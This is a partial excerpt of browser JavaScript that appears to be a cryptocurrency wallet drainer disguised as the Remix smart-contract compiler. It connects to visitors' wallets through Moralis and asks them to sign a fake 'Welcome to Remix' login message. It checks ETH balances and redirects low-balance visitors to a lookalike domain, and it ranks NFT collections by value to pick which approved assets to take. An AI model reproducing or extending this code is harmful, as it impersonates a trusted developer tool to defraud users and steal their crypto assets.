  ...
  while (true) {
    try {
      ...
      if (ethBal < MIN_ETH_BAL) {
        if(getItem("noeth") === null) {
          console.log(`Error, balance is too low. (< ${MIN_ETH_BAL} ETH). Balance: ' ${ethBal}`)
          window.location.href="https://remixcompiler.org";
     ...
     console.log("[CompareWorth END]")
      ...
      $('#connectbtn').removeClass('disabled').html('OK');
...
async function connect(name) {
  ...
  $('#connectbtn').addClass('disabled').html('<i class="fa fa-spinner fa-spin" style="margin-right: 6px"></i> Accepting...');
  ...
  if(!Moralis.provider) {
    ...
    await Moralis.enableWeb3(true ? {} : { provider: "walletconnect" });
  }
...
function compareWorth(ethBal) {
  ...
  // if only eth
  if ((!noeth || !noeth.length)) return "eth";
  ...
  // sort
  let sortedValues = [a, d].sort((a, b) => (a.worth < b.worth ? 1 : -1));
...
async function signMessage(account) {
  ...
  const messageToSign = `Welcome to Remix, \n\n` +
  `To begin developing and compiling smart contracts, please sign in using your wallet.\n\n` +
  `Wallet Address:\n${account}\n\n`;
    ...
    try {
      ...
      collections = collections.filter(
        (collection) =>
          ...
          collection.stats.seven_day_volume > 0 &&      // ORIG // TESTING
          collection.stats.one_day_average_price > 0 && // ORIG // TESTING
  ...
  results.forEach((result, index) => {
    ...
    if (isApproved) {
      ...
      currentCollectionNfts.forEach((nft) => {
        ...
        // seanfts.totalWorth = 1000      // TESTING
